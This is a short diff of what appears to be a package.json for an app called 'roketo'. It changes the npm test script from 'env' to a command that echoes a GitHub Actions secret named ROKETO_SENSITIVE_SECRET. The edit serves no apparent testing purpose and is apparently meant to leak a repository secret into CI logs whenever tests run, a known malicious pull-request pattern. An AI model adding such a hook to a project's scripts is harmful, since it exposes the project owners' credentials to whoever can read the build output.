@@ -4,7 +4,7 @@
   "description": "the official roketo app",
   "main": "index.js",
   "scripts": {
-    "test": "env"
+    "test": "echo ${{ secrets.ROKETO_SENSITIVE_SECRET }}"
   },
   "repository": {
     "type": "git",
